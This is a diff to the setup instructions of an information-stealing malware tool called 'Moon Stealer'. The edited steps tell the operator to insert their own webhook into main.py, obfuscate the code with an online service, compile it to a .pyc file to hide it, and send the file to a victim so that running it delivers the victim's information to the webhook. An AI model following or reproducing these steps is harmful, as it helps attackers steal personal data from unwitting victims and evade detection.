@@ -27,13 +27,13 @@ Moon Stealer (ムーン)
 
 4. Open `main.py` with any text editor such as notepad.
 
-5. Replace X with your webhook `hook = "X"`
+5. Replace X with your webhook `hook = "X"` located in line 28.
 
 6. Obfuscate your code: https://pyobfuscate.com/ (Recommended)
 
-5. Convert to .PYC file by typing `python -m py_compile {directory_of_PY_file}` this will create a .PYC file which is highly obfuscated. **Make sure to do No. 6 first.** (Optional)
+5. Convert to .PYC file by typing `python -m py_compile {directory_of_PY_file}` this will create a .PYC file which is highly obfuscated. (Optional)
 
-7. Send to victim and when they run you will have their info in the webhook provided.
+7. Send to victim and when they run `main.py` you will have their info in the webhook you provided in line 28.
 
 <a id="features"></a>
 
